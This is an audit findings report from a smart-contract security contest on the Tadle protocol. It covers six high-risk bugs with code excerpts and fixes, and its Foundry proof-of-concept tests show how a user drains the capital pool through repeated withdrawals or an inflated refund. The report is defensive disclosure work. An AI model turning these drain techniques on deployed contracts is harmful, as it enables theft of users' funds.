# Tadle - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. The aboardAskOffer Function can overestimate the claimable balance](#H-01)
    - ### [H-02. The withdraw function cannot operate if the token is not the native token due to a lack of allowance.](#H-02)
    - ### [H-03. settleAskTaker credit with the wrong token and the wrong person](#H-03)
    - ### [H-04. wrong acces control for the settleAskTaker function](#H-04)
    - ### [H-05. The withdraw function cannot operate if the token is the native token.](#H-05)
    - ### [H-06. The claimable token of a user is not set to zero after a withdraw](#H-06)




# <a id='contest-summary'></a>Contest Summary

### Sponsor: Tadle

### Dates: Aug 5th, 2024 - Aug 12th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-08-tadle)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 6
- Medium: 0
- Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. The aboardAskOffer Function can overestimate the claimable balance            



## Summary

When a user create a taker for an offer he can then use the stock newly created to list an offer. After that he can abort the offer by calling aboardAskOffer if the offer is the ask type. This function will the credit the sender if there is an amount that have not been used. However this function will overestimate the claimable balance of the sender if when he listed the offer he user a collateral rate hire than the original offer. 

## Vulnerability Details

When the user list the offer he can use a different collateral rate than the original offer if the settled type is not turbo as we can see here in the listOffer function (L-335) in the PreMarkets contract: 

```Solidity
  if (makerInfo.offerSettleType == OfferSettleType.Turbo) {
            address originOffer = makerInfo.originOffer;
            OfferInfo memory originOfferInfo = offerInfoMap[originOffer];

            if (_collateralRate != originOfferInfo.collateralRate) {
                revert InvalidCollateralRate();
            }
            originOfferInfo.abortOfferStatus = AbortOfferStatus.SubOfferListed;
        }

```

if the settle type of the maker is Protected he can use whatever collateral rate if it's above 10\_000 and he will then send 

the amount with collateral rate of the previous offer as we can see in this line(346)

```Solidity
/// @dev transfer collateral when offer settle type is protected
        if (makerInfo.offerSettleType == OfferSettleType.Protected) {
            uint256 transferAmount = OfferLibraries.getDepositAmount(
                offerInfo.offerType, offerInfo.collateralRate, _amount, true, Math.Rounding.Ceil
            );

            ITokenManager tokenManager = tadleFactory.getTokenManager();
            tokenManager.tillIn{value: msg.value}(_msgSender(), makerInfo.tokenAddress, transferAmount, false);
        }

```

If the  offer is an Ask he can now call aboardAskOffer(L-536) in the PreMarkets contract. 

this function will refund the sender by the unused amount of the offer based on the amount the points and the usedPoints. 

The problem occure when calculating the transferAmount here(L-595) :

```Solidity
    uint256 transferAmount = OfferLibraries.getDepositAmount(
            offerInfo.offerType,
            offerInfo.collateralRate,
            remainingAmount,
            true,
            Math.Rounding.Floor
        );
```

The function calculated the amount that the sender originally send when he created the offer, however the function do a miscalculation because it calculat the transferAmount withe the collateral Rate of the current offer not the previous one. resulting in a miscalculation of the transferAmount if the settle type is protected. 

As we can see in the getDepositAmount function(L-27) in the OfferLibraries library : 

```Solidity
 function getDepositAmount(
        OfferType _offerType,
        uint256 _collateralRate,
        uint256 _amount,
        bool _isMaker,
        Math.Rounding _rounding
    ) internal pure returns (uint256) {
        /// @dev bid offer
        if (_offerType == OfferType.Bid && _isMaker) {
            return _amount;
        }

        /// @dev ask order
        if (_offerType == OfferType.Ask && !_isMaker) {
            return _amount;
        }

        return
            Math.mulDiv(
                _amount,
                _collateralRate,
                Constants.COLLATERAL_RATE_DECIMAL_SCALER,
                _rounding
            );
    }

```

This function will return the remainig amount with muldiv with collateral rate and the scaler but this is not the correct amount if the collateral rate used in the listOffer function is different from the one used in the original offer.

We can the imagine a scenario where the user use this vulnerability to drain the protocol : 

Before running the POC you must fix the bug with the allowance that I mentionned in a previous submittion 

add this if statement in the \_transfer function in the token Manager before the \_safe\_transfer\_from to ensure that the token Manager have enougth allowance : 

```Solidity
 if (_from == _capitalPoolAddr && IERC20(_token).allowance(_from, address(this)) == 0x0) {
            ICapitalPool(_capitalPoolAddr).approve(_token);
        }
```

You can copy paste this test in the PreMarkets.t.sol

```Solidity
 function test_withdrawPOC4() public {
     // We initialise the capital pool balance before the user do anything. 
      mockUSDCToken.mint(address(capitalPool), 1);
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(marketPlace, address(mockUSDCToken), 1, 1, 10000, 0, OfferType(0), OfferSettleType(0))
        );
       address offer1Addr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker(offer1Addr, 1);
        //we assert that
        address stock1Addr = GenerateAddress.generateStockAddress(1);
        // The bug happen because the sender used a hire collateral rate than the one he used to create the offer
        preMarktes.listOffer(stock1Addr, 1, 40000);

        address offer2Addr = GenerateAddress.generateOfferAddress(1);
        uint256 balanceOfCapitalPoolBefore = mockUSDCToken.balanceOf(address(capitalPool));
        uint256 balanceOfUserBefore = mockUSDCToken.balanceOf(user);
        preMarktes.abortAskOffer(stock1Addr, offer2Addr);
        //Here the claimable balance of the user is 4 however it should be 3 since the user only send 3 tokens 
        assertEq(tokenManager.userTokenBalanceMap(user, address(mockUSDCToken), TokenBalanceType(4)),4);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType(4));
        vm.stopPrank();
        uint256 balanceOfCapitalPoolAfter = mockUSDCToken.balanceOf(address(capitalPool));
        uint256 balanceOfUserAfter = mockUSDCToken.balanceOf(user);
        //assert that the user drained the protocol
        //The user drained all the protcol even the wei that was here before even he do anything
        assertEq(balanceOfCapitalPoolAfter, 0);
        assertEq(balanceOfUserAfter, balanceOfUserBefore + balanceOfCapitalPoolBefore);
    }
```

## Impact

The user can use this to drain all the protocol and any use that aboard an ask type in protected mode can overestimate his balance 

## Tools Used

Echidna

## Recommendations

I thing that the protocol in protected mode should use the \_collateral that the sender used when he listed the offer as it is specified in the documentation: 

```Solidity
  if (makerInfo.offerSettleType == OfferSettleType.Protected) {
            uint256 transferAmount = OfferLibraries.getDepositAmount(
                offerInfo.offerType, _collateralRate, _amount, true, Math.Rounding.Ceil
            );
```

## <a id='H-02'></a>H-02. The withdraw function cannot operate if the token is not the native token due to a lack of allowance.            



## Summary

When a user has a claimable balance, he call the `withdraw` function (L-137) in the tokenManager, which transfers the tokens from the capital pool to the msg.sender and calls the approve function in the capital pool, allowing the capital pool to approve the token manager to transfer the tokens from the capital pool to the sender. However, this call will consistently revert if the token is not the native token because the token manager don’t approve the token before doing the call.

## Vulnerability Details

If the token to be withdrawn is not the native token, `the _safe_transfer_from` function (L-95 in the Rescuable contract) will be called internally int the token Manager. However, this call will revert because the tokenManager does not call the approve function of the capital pool, and this block of code will be executed:

```Solidity
else {
            /**
             * @dev token is ERC20 token
             * @dev transfer from capital pool to msg sender
             */
            _safe_transfer_from(
                _tokenAddress,
                capitalPoolAddr,
                _msgSender(),
                claimAbleAmount
            );
        }

        emit Withdraw(
            _msgSender(),
            _tokenAddress,
            _tokenBalanceType,
            claimAbleAmount
        );

```

The approve function of the capital pool will not be called, causing the call to revert.

You can copy paste this test in the PreMarkets.t.sol you just have to import the Rescuable contract to have the selector of the error:

```Solidity
function test_withdrawPOC2() public {
        vm.startPrank(user);
        preMarktes.createOffer{value: 22214494796106255}(
            CreateOfferParams(marketPlace, address(mockUSDCToken), 1, 1, 10000, 0, OfferType(0), OfferSettleType(0))
        );
        preMarktes.createTaker{value: 3}(0xE619a2899a8db14983538159ccE0d238074a235d, 1);
         vm.expectRevert(Rescuable.TransferFailed.selector);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType(2));
        vm.stopPrank();
    }
```

## Impact
The users will not be able to withdraw their tokens. 

## Tools Used
Manual Review
## Recommendations
Add a check to ensure that there is enought allowance to perform the transferFrom like this:

```Solidity
 if (IERC20(_tokenAddress).allowance(capitalPoolAddr, address(this)) < claimAbleAmount) {
              ICapitalPool(capitalPoolAddr).approve(_tokenAddress);
           }
            _safe_transfer_from(_tokenAddress, capitalPoolAddr, _msgSender(), claimAbleAmount);
```

## <a id='H-03'></a>H-03. settleAskTaker credit with the wrong token and the wrong person            



## Summary

When an ask taker settle his taker offer the function settleAskTaker (L-335) will credit the maker of the collateralFee and the taker with the points. But the function credit the authority of the offer with the points amount  with the wrong token.

## Vulnerability Details

when the maker call settleAskTaker he will send a settled points amount as we can see here (L-376): 

```Solidity
 if (settledPointTokenAmount > 0) {
            tokenManager.tillIn(
                _msgSender(),
                marketPlaceInfo.tokenAddress,
                settledPointTokenAmount,
                true
            );

```

The problem is that just after that we credit the authority of the offer with the same amount and with the collateral token address as we can see here :  

```Solidity
   tokenManager.addTokenBalance(
                TokenBalanceType.PointToken,
                offerInfo.authority,
                makerInfo.tokenAddress,
                settledPointTokenAmount
            );
        }

```

This is totally wrong because the address of the token is wrong it should be the market place token.

## Impact

The user wil be credited with a possible huge amount.

## Tools Used

Echidna

## Recommendations

Make these changes to the settle ask taker function : 

```Solidity
 if (settledPointTokenAmount > 0) {
            tokenManager.tillIn(_msgSender(), marketPlaceInfo.tokenAddress, settledPointTokenAmount, true);

            tokenManager.addTokenBalance(
                TokenBalanceType.PointToken, offerInfo.authority,marketPlaceInfo.tokenAddress, settledPointTokenAmount
            );
        }
```

## <a id='H-04'></a>H-04. wrong acces control for the settleAskTaker function            



## Summary

The function settleAskTaker(335) in the deliveryPlace is only callable by the owner of the contract of the authority of the offer which make no sense since it should be the taker that settle this and pay the points.

## Vulnerability Details

the function is only callable by the authority offer as we can see here(L-360) : 

```Solidity
 if (status == MarketPlaceStatus.AskSettling) {
            if (_msgSender() != offerInfo.authority) {
                revert Errors.Unauthorized();
            }
        } else {
            if (_msgSender() != owner()) {
                revert Errors.Unauthorized();
            }
            if (_settledPoints > 0) {
                revert InvalidPoints();
            }
        }
```

However according to the comments of the function and the documentation the caller should be the stock authority

## Impact

it will be impossible to settle an ask taker.

## Tools Used

Manual Review

## Recommendations

Change the block of code to correspond to the documentation : 

```Solidity
 if (status == MarketPlaceStatus.AskSettling) {
            if (_msgSender() != stockInfo.authority) {
                revert Errors.Unauthorized();
            }
        } else {
            if (_msgSender() != owner()) {
                revert Errors.Unauthorized();
            }
            if (_settledPoints > 0) {
                revert InvalidPoints();
            }
        }

```

## <a id='H-05'></a>H-05. The withdraw function cannot operate if the token is the native token.            



## Summary

When a user has a claimable balance, he call the `withdraw` function (L-137) in the `tokenManager`, which transfers the tokens from the capital pool to the msg.sender and calls the approve function in the capital pool, allowing the capital pool to approve itself to transfer the tokens from the capital pool to the sender. However, this call will consistently revert because the capital pool calls the approve function in the tokenManager, which has not implemented this function.

## Vulnerability Details

When a user tries to withdraw, the user calls the `withdraw` function (L-137) in the tokenManager. If the token to be withdrawn is the native token, then the \`\_transfer\` function (L-186) is used, and this block of code will be executed :

```Solidity
if (

            \_from == \_capitalPoolAddr &&

            IERC20(\_token).allowance(\_from, address(this)) == 0x0

        ) {

            ICapitalPool(\_capitalPoolAddr).approve(address(this));

        }

```

And the `approve` function (L-24) of the capitalPool will be executed:

```Solidity
function approve(address tokenAddr) external {
        address tokenManager = tadleFactory.relatedContracts(
            RelatedContractLibraries.TOKEN_MANAGER
        );
        (bool success, ) = tokenAddr.call(
            abi.encodeWithSelector(
                APPROVE_SELECTOR,
                tokenManager,
                type(uint256).max
            )
        );

        if (!success) {
            revert ApproveFailed();
        }
    }
```

But this call will revert because it will perform a low-level call to the tokenManager as the argument used to call approve is `address(this)` within the tokenManager.

## Impact

It will be impossible to withdraw any amount if the token is the native token

## Tools Used

Manual Review

## Recommendations

Change de `_transfer` function to approve with the token address like this :

`````Solidity
  if (_from == _capitalPoolAddr && IERC20(_token).allowance(_from, address(this)) == 0x0) {
            ICapitalPool(_capitalPoolAddr).approve(_token);
        }

## <a id='H-06'></a>H-06. The claimable token of a user is not set to zero after a withdraw            



## Summary

When a user has a claimable balance, he call the `withdraw` function (L-137) in the `tokenManager`, which transfers the tokens from the capital pool to the msg.sender and calls the approve function in the capital pool, allowing the capital pool to approve itself to transfer the tokens from the capital pool to the sender. However, the claimableBalance don't decrease at all so the user can keep calling the withdraw function until totally draining  the protocol. 

## Vulnerability Details

If a user call the withdraw function the token manager will send all the claimable balance of the user as we can see : 

```Solidity
 function withdraw(
        address _tokenAddress,
        TokenBalanceType _tokenBalanceType
    ) external whenNotPaused {
uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
           _tokenAddress ][_tokenBalanceType];
...code 

            _safe_transfer_from(
                _tokenAddress,
                capitalPoolAddr,
                _msgSender(),
                claimAbleAmount
            );
        }

        emit Withdraw(
            _msgSender(),
            _tokenAddress,
            _tokenBalanceType,
            claimAbleAmount
        );


```

But as we can see the claimableBalance is absolutely no set to zero.

Before running the POC you must fix the bug with the allowance that I mentionned in a previous submittion 

add this if statement in the withdraw function before the \_safe\_transfer\_from to ensure that the token Manager have enougth allowance : 

```Solidity
else {
            /**
             * @dev token is ERC20 token
             * @dev transfer from capital pool to msg sender
             */
            if (IERC20(_tokenAddress).allowance(capitalPoolAddr, address(this)) < claimAbleAmount) {
                ICapitalPool(capitalPoolAddr).approve(_tokenAddress);
            }
            _safe_transfer_from(_tokenAddress, capitalPoolAddr, _msgSender(), claimAbleAmount);
        }
```

you can copy paste this test in the PreMArkets.t.sol file:

```Solidity
 function test_withdrawPOC3() public {
        mockUSDCToken.mint(address(capitalPool), 3);
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(marketPlace, address(mockUSDCToken), 1, 1, 10000, 0, OfferType(0), OfferSettleType(0))
        );
        address offer1Addr = GenerateAddress.generateOfferAddress(0);
        address stock1Addr = GenerateAddress.generateStockAddress(0);
        // close the offer to accrued the claimable balance of the user
        preMarktes.closeOffer(stock1Addr, offer1Addr);

        uint256 balanceOfCapitalPoolBefore = mockUSDCToken.balanceOf(address(capitalPool));
        uint256 balanceOfUserBefore = mockUSDCToken.balanceOf(user);
        uint256 claimableBalanceBefore =
            tokenManager.userTokenBalanceMap(user, address(mockUSDCToken), TokenBalanceType(4));
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType(4));
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType(4));
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType(4));
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType(4));
        vm.stopPrank();
        uint256 claimableBalanceAfter =
            tokenManager.userTokenBalanceMap(user, address(mockUSDCToken), TokenBalanceType(4));

        uint256 balanceOfCapitalPoolAfter = mockUSDCToken.balanceOf(address(capitalPool));
        uint256 balanceOfUserAfter = mockUSDCToken.balanceOf(user);
        //assert that the claimable balance don't change after the withdraw
        assertEq(claimableBalanceBefore, claimableBalanceAfter);
        // assert that the user drained the protocol

        assertEq(balanceOfCapitalPoolAfter, 0);
        assertEq(balanceOfUserAfter, balanceOfUserBefore + balanceOfCapitalPoolBefore);
    }
```

## Impact

The user can withdraw indefinitely until draining the protocol

## Tools Used

Manual Review

## Recommendations

Add just this line of code at the end of the withdraw function :

```Solidity
   userTokenBalanceMap[_msgSender()][_tokenAddress][_tokenBalanceType] = 0;
        emit Withdraw(_msgSender(), _tokenAddress, _tokenBalanceType, claimAbleAmount);
```

    





